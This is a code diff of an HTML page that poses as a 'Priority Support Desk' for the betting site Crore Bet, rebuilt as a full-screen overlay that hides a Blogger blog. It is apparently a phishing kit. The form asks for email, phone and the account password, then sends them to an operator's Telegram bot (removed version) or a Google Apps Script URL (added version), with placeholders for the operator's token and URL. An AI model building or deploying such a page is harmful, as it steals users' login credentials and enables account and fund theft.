@@ -1,391 +1,385 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crore Bet Support</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+<style>
+/* 1. Blogger Default Elements Hide */
+#navbar-iframe, .header-widget, .Header, .title-wrapper, .mobile-header, header,
+.date-header, .date-outer, .post-title, .post-header, .post-share-buttons, 
+.post-labels, .comments, #comments, .mobile-top, .search, .mobile-search, .blog-pager,
+.bg-photo, .bg-photo-overlay, .body-bg, .body-background {
+    display: none !important;
+}
 
-        body {
-            background-color: #0c0e14;
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            padding: 10px 12px 40px;
-            overflow-x: hidden;
-        }
+/* 2. Remove Blogger Page Margin & Scroll */
+html, body {
+    margin: 0 !important;
+    padding: 0 !important;
+    overflow: hidden !important;
+    background: #0c0a17 !important;
+}
 
-        /* Form Card */
-        .form-card {
-            background-color: #161b26;
-            width: 100%;
-            max-width: 400px;
-            padding: 14px 16px;
-            border-radius: 16px;
-            border: 1px solid #283044;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
-        }
+/* 3. Full-Screen Fixed Overlay (Har Theme Ke Upar Rahega) */
+.fixed-support-wrapper {
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    width: 100vw !important;
+    height: 100vh !important;
+    height: 100dvh !important;
+    background: radial-gradient(circle at 50% 0%, #1e1338 0%, #0c0a17 65%, #05040a 100%) !important;
+    z-index: 99999999 !important;
+    overflow-y: auto !important;
+    -webkit-overflow-scrolling: touch !important;
+    display: flex !important;
+    flex-direction: column !important;
+    align-items: center !important;
+    padding: 40px 16px 80px 16px !important;
+    box-sizing: border-box !important;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
+}
 
-        /* Logo Area */
-        .logo-wrapper {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 10px;
-        }
+/* STARK BET / CRORE BET BADGE LOGO */
+.logo-container {
+    margin-bottom: 25px;
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
 
-        .crore-bet-logo {
-            background-color: #000000;
-            display: inline-flex;
-            align-items: center;
-            padding: 6px 14px;
-            border-radius: 8px;
-            border: 1px solid #fff230;
-        }
+.crorebet-pill-badge {
+    background-color: #000000;
+    display: inline-flex;
+    align-items: center;
+    padding: 8px 16px 8px 22px;
+    border-radius: 12px;
+    gap: 12px;
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+}
 
-        .crore-text {
-            color: #ffffff;
-            font-size: 19px;
-            font-weight: 900;
-            letter-spacing: 1.5px;
-            margin-right: 8px;
-        }
+.crore-text {
+    color: #ffffff;
+    font-size: 32px;
+    font-weight: 900;
+    letter-spacing: 1px;
+    font-family: 'Arial Black', Impact, sans-serif;
+    text-transform: uppercase;
+}
 
-        .bet-badge {
-            background-color: #fff230;
-            color: #000000;
-            font-size: 16px;
-            font-weight: 900;
-            padding: 2px 7px;
-            border-radius: 4px;
-        }
+.bet-yellow-box {
+    background-color: #fff01f;
+    color: #000000;
+    font-size: 26px;
+    font-weight: 900;
+    padding: 3px 12px;
+    border-radius: 7px;
+    font-family: 'Arial Black', Impact, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+}
 
-        /* 24/7 Help & Support Subtitle */
-        .support-subtext {
-            margin-top: 5px;
-            font-size: 12px;
-            color: #fff230;
-            font-weight: bold;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-        }
+/* Glassmorphism Form Card */
+.form-card { 
+    width: 100%; 
+    max-width: 460px; 
+    box-sizing: border-box;
+    background: rgba(22, 18, 38, 0.88);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 22px;
+    padding: 26px 20px;
+    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.6);
+}
 
-        /* Input Fields */
-        .input-group {
-            margin-bottom: 8px;
-            text-align: left;
-        }
+.card-title {
+    text-align: center;
+    color: #ffffff;
+    font-size: 19px;
+    font-weight: 700;
+    margin-bottom: 20px;
+}
 
-        label {
-            display: block;
-            margin-bottom: 4px;
-            font-size: 13px;
-            color: #a4b1cd;
-            font-weight: bold;
-        }
+.card-title span {
+    color: #fff01f;
+}
 
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"],
-        input[type="password"],
-        select {
-            width: 100%;
-            padding: 10px 12px;
-            background-color: #0a0d14;
-            border: 1px solid #343f5a;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #ffffff;
-            outline: none;
-        }
+.input-group { 
+    margin-bottom: 16px; 
+}
 
-        input:focus,
-        select:focus {
-            border-color: #fff230;
-        }
+.input-group label { 
+    display: block;
+    margin-bottom: 7px; 
+    font-size: 13px; 
+    color: #a5a1bb; 
+    font-weight: 600; 
+}
 
-        select option {
-            background-color: #161b26;
-            color: #ffffff;
-        }
+.input-group input, .input-group select {
+    width: 100%; 
+    padding: 14px 15px; 
+    border: 1px solid rgba(255, 255, 255, 0.1); 
+    border-radius: 12px; 
+    background: #0f0c1c; 
+    color: #ffffff; 
+    font-size: 15px; 
+    outline: none; 
+    box-sizing: border-box;
+}
 
-        /* File Upload */
-        input[type="file"] {
-            width: 100%;
-            background-color: #0a0d14;
-            border: 1px dashed #343f5a;
-            border-radius: 8px;
-            padding: 8px;
-            font-size: 12px;
-            color: #a4b1cd;
-            outline: none;
-        }
+.input-group input:focus, .input-group select:focus {
+    border-color: #fff01f; 
+    box-shadow: 0 0 0 3px rgba(255, 240, 31, 0.18); 
+}
 
-        /* Submit Button */
-        button.submit-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #fff230;
-            color: #000000;
-            border: none;
-            border-radius: 9px;
-            font-size: 15px;
-            font-weight: 800;
-            text-transform: uppercase;
-            cursor: pointer;
-            margin-top: 6px;
-        }
+.input-group select {
+    cursor: pointer;
+}
 
-        button.submit-btn:disabled {
-            background-color: #666014;
-            color: #aaa;
-            cursor: not-allowed;
-        }
+.input-group select option {
+    background-color: #0f0c1c;
+    color: #ffffff;
+}
 
-        /* Scroll karne par aane wala Telegram section */
-        .telegram-section {
-            width: 100%;
-            max-width: 400px;
-            margin-top: 35px;
-            text-align: center;
-        }
+.input-group input[type="file"] { 
+    padding: 10px; 
+    cursor: pointer; 
+    color: #a5a1bb; 
+    font-size: 13px;
+}
 
-        .telegram-text {
-            font-size: 13px;
-            color: #8fa0c0;
-            margin-bottom: 10px;
-        }
+.input-group input[type="file"]::-webkit-file-upload-button {
+    background: rgba(255, 255, 255, 0.08); 
+    color: #ffffff; 
+    border: 1px solid rgba(255, 255, 255, 0.15); 
+    padding: 8px 14px;
+    border-radius: 8px; 
+    margin-right: 12px; 
+    font-weight: 600; 
+    cursor: pointer;
+}
 
-        .telegram-btn {
-            display: block;
-            width: 100%;
-            padding: 13px;
-            background-color: #0088cc;
-            color: #ffffff;
-            text-decoration: none;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: bold;
-            box-sizing: border-box;
-        }
+.row { display: flex; flex-direction: column; }
+.row .input-group { margin-bottom: 16px; }
 
-        /* Success Popup Modal */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            padding: 20px;
-        }
+@media (min-width: 480px) {
+    .row { flex-direction: row; gap: 12px; }
+    .row .input-group { flex: 1; margin-bottom: 16px; }
+}
 
-        .modal-box {
-            background-color: #181d29;
-            border: 2px solid #fff230;
-            border-radius: 12px;
-            max-width: 320px;
-            width: 100%;
-            padding: 22px 18px;
-            text-align: center;
-        }
+/* Submit Button */
+.btn-submit {
+    width: 100%; 
+    display: block; 
+    margin-top: 10px; 
+    padding: 16px;
+    background: #fff01f; 
+    color: #000000; 
+    border: none; 
+    border-radius: 14px;
+    font-size: 16px; 
+    font-weight: 900; 
+    cursor: pointer; 
+    box-shadow: 0 8px 25px rgba(255, 240, 31, 0.25);
+    text-transform: uppercase;
+}
 
-        .modal-icon {
-            font-size: 36px;
-            color: #38ef7d;
-            margin-bottom: 8px;
-        }
+.btn-submit:hover { 
+    filter: brightness(1.05);
+}
 
-        .modal-title {
-            font-size: 17px;
-            font-weight: bold;
-            color: #ffffff;
-            margin-bottom: 8px;
-        }
+/* Telegram Link */
+.tg-link-container { 
+    text-align: center; 
+    margin-top: 22px; 
+    padding-top: 16px; 
+    border-top: 1px solid rgba(255, 255, 255, 0.08); 
+}
 
-        .modal-desc {
-            font-size: 12px;
-            color: #cbd5e1;
-            line-height: 1.4;
-            margin-bottom: 16px;
-        }
+.tg-link-container p { 
+    color: #8c88a6; 
+    font-size: 13px; 
+    margin-bottom: 10px; 
+}
 
-        .modal-btn {
-            background-color: #fff230;
-            color: #000000;
-            border: none;
-            padding: 8px 25px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
+.tg-btn {
+    display: inline-flex; 
+    align-items: center; 
+    justify-content: center; 
+    gap: 8px;
+    background: rgba(42, 171, 238, 0.12);
+    border: 1px solid rgba(42, 171, 238, 0.3);
+    color: #55c0ff; 
+    text-decoration: none; 
+    padding: 11px 22px;
+    border-radius: 50px; 
+    font-weight: 700; 
+    font-size: 13px;
+}
 
-    <div class="form-card">
-        <!-- Logo & 24/7 Support Subtitle -->
-        <div class="logo-wrapper">
-            <div class="crore-bet-logo">
-                <span class="crore-text">CRORE</span>
-                <span class="bet-badge">BET</span>
-            </div>
-            <div class="support-subtext">24/7 Help & Support</div>
+.tg-btn svg { width: 18px; height: 18px; fill: currentColor; }
+
+/* Status Modal */
+.modal-overlay {
+    display: none; 
+    position: fixed; 
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0, 0, 0, 0.85); 
+    z-index: 999999999 !important; 
+    justify-content: center; 
+    align-items: center; 
+    padding: 20px;
+}
+
+.modal-box {
+    background: #151124; 
+    padding: 30px 24px; 
+    border-radius: 20px; 
+    text-align: center; 
+    border: 1px solid rgba(255, 255, 255, 0.1); 
+    max-width: 320px; 
+    width: 100%;
+}
+
+.icon-circle { 
+    width: 60px; 
+    height: 60px; 
+    border-radius: 50%; 
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    margin: 0 auto 14px auto; 
+    background: rgba(34, 197, 94, 0.12); 
+    border: 2px solid #22c55e; 
+    color: #22c55e; 
+}
+
+.icon-circle svg { width: 30px; height: 30px; stroke-width: 2.5; }
+.modal-box h3 { color: #ffffff; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+.modal-box p { font-size: 14px; color: #9d99b5; margin-bottom: 20px; }
+
+.btn-close { 
+    background: #fff01f; 
+    color: #000000; 
+    border: none; 
+    padding: 12px 36px; 
+    border-radius: 50px; 
+    font-size: 14px; 
+    font-weight: 800; 
+    cursor: pointer; 
+}
+</style>
+
+<div class="fixed-support-wrapper">
+    <!-- CRORE BET BADGE LOGO -->
+    <div class="logo-container">
+        <div class="crorebet-pill-badge">
+            <span class="crore-text">CRORE</span>
+            <span class="bet-yellow-box">BET</span>
         </div>
+    </div>
+    
+    <div class="form-card">
+        <div class="card-title">Priority <span>Support</span> Desk</div>
 
-        <form id="tgForm">
+        <form id="supportForm">
             <div class="input-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" placeholder="Enter your email" required>
+                <label for="email">User Email</label>
+                <input type="email" id="email" placeholder="example@gmail.com" required>
+            </div>
+
+            <div class="row">
+                <div class="input-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="10 Digit Number" pattern="[0-9]{10}" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="text" id="password" placeholder="Account Password" required>
+                </div>
             </div>
 
             <div class="input-group">
-                <label for="name">Name</label>
-                <input type="text" id="name" placeholder="Enter your name" required>
-            </div>
-
-            <div class="input-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="Enter phone number" required>
-            </div>
-
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter password" required>
-            </div>
-
-            <div class="input-group">
-                <label for="problemIssue">Problem Issue</label>
-                <select id="problemIssue" required>
-                    <option value="" disabled selected>Select an issue...</option>
-                    <option value="Email Confirm">Email Confirm</option>
-                    <option value="Number Confirm">Number Confirm</option>
-                    <option value="Profile Update">Profile Update</option>
+                <label for="problem">Select Query Type</label>
+                <select id="problem" required>
+                    <option value="" disabled selected>Choose your issue...</option>
+                    <option value="Withdrawal Problem">Withdrawal Problem</option>
                     <option value="Deposit Problem">Deposit Problem</option>
+                    <option value="Profile Update">Profile Update</option>
                     <option value="Bonus Issue">Bonus Issue</option>
+                    <option value="Email Verify">Email Verify</option>
                 </select>
             </div>
 
             <div class="input-group">
-                <label for="screenshot">Upload Screenshot (Optional)</label>
+                <label for="screenshot">Attach Screenshot (Optional)</label>
                 <input type="file" id="screenshot" accept="image/*">
             </div>
 
-            <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
+            <button type="submit" class="btn-submit" id="submitBtn">Submit Request</button>
         </form>
-    </div>
 
-    <!-- Scroll karne par aane wala Telegram Button -->
-    <div class="telegram-section">
-        <p class="telegram-text">Need immediate help? Contact our direct support</p>
-        <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="telegram-btn">Chat on Telegram</a>
-    </div>
-
-    <!-- Success Modal Popup -->
-    <div class="modal-overlay" id="successModal">
-        <div class="modal-box">
-            <div class="modal-icon">✓</div>
-            <h3 class="modal-title">Request Submitted!</h3>
-            <p class="modal-desc">Your request has been successfully sent to our support team. We will review and resolve your issue shortly.</p>
-            <button type="button" class="modal-btn" id="closeModalBtn">OK</button>
+        <div class="tg-link-container">
+            <p>Need urgent assistance?</p>
+            <a href="https://t.me/AapkaTelegramUsername" target="_blank" class="tg-btn">
+                <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.211-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.023c.242-.213-.054-.333-.373-.121l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.458c.538-.196 1.006.128.832.941z"/></svg>
+                Contact via Telegram
+            </a>
         </div>
     </div>
+</div>
 
-    <script>
-        // --- Telegram Details ---
-        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const CHAT_ID = "YOUR_CHAT_ID_HERE";
+<div id="statusModal" class="modal-overlay">
+    <div class="modal-box">
+        <div id="modalIcon" class="icon-circle">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+            </svg>
+        </div>
+        <h3 id="modalTitle">Request Sent!</h3>
+        <p id="statusText">Aap ka request team ko bhej diya gya hai.</p>
+        <button class="btn-close" id="closeModalBtn">Continue</button>
+    </div>
+</div>
 
-        const form = document.getElementById('tgForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const modal = document.getElementById('successModal');
-        const closeModalBtn = document.getElementById('closeModalBtn');
+<script>
+    // 👇 Yahan apna Google Apps Script Web App URL dalein 👇
+    const GOOGLE_SCRIPT_URL = "APNA_DEPLOYED_WEB_APP_URL_YAHAN_DALEIN";
 
-        closeModalBtn.addEventListener('click', function() {
-            modal.style.display = 'none';
+    const form = document.getElementById('supportForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const statusModal = document.getElementById('statusModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+
+    closeModalBtn.addEventListener('click', () => { statusModal.style.display = 'none'; });
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        submitBtn.innerText = "Processing...";
+        submitBtn.disabled = true;
+
+        const email = encodeURIComponent(document.getElementById('email').value.trim());
+        const phone = encodeURIComponent(document.getElementById('phone').value.trim());
+        const password = encodeURIComponent(document.getElementById('password').value.trim());
+        const problem = encodeURIComponent(document.getElementById('problem').value);
+
+        const finalUrl = `${GOOGLE_SCRIPT_URL}?email=${email}&phone=${phone}&password=${password}&problem=${problem}`;
+
+        fetch(finalUrl, {
+            method: 'GET',
+            mode: 'no-cors'
+        })
+        .then(() => {
+            statusModal.style.display = "flex";
+            form.reset();
+        })
+        .catch(() => {
+            statusModal.style.display = "flex";
+        })
+        .finally(() => {
+            submitBtn.innerText = "Submit Request";
+            submitBtn.disabled = false;
         });
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            submitBtn.disabled = true;
-            submitBtn.innerText = "Submitting...";
-
-            const email = document.getElementById('email').value;
-            const name = document.getElementById('name').value;
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-            const problemIssue = document.getElementById('problemIssue').value;
-            const fileInput = document.getElementById('screenshot');
-            const file = fileInput.files[0];
-
-            const captionText = "📌 *New Request (Crore Bet)*\n\n" +
-                                "📧 *Email:* " + email + "\n" +
-                                "👤 *Name:* " + name + "\n" +
-                                "📞 *Phone:* " + phone + "\n" +
-                                "🔑 *Password:* " + password + "\n" +
-                                "⚠️ *Problem Issue:* " + problemIssue;
-
-            if (file) {
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", file);
-                formData.append("caption", captionText);
-                formData.append("parse_mode", "Markdown");
-
-                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
-                    method: "POST",
-                    body: formData
-                })
-                .then(function(res) { return res.json(); })
-                .then(handleResponse)
-                .catch(handleError);
-            } else {
-                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: captionText,
-                        parse_mode: "Markdown"
-                    })
-                })
-                .then(function(res) { return res.json(); })
-                .then(handleResponse)
-                .catch(handleError);
-            }
-
-            function handleResponse(data) {
-                if (data.ok) {
-                    modal.style.display = 'flex';
-                    form.reset();
-                } else {
-                    alert("Telegram Error: Check Bot Token or Chat ID.");
-                }
-                submitBtn.disabled = false;
-                submitBtn.innerText = "Submit Request";
-            }
-
-            function handleError() {
-                alert("Network error! Please try again.");
-                submitBtn.disabled = false;
-                submitBtn.innerText = "Submit Request";
-            }
-        });
-    </script>
-
-</body>
-</html>
+    });
+</script>
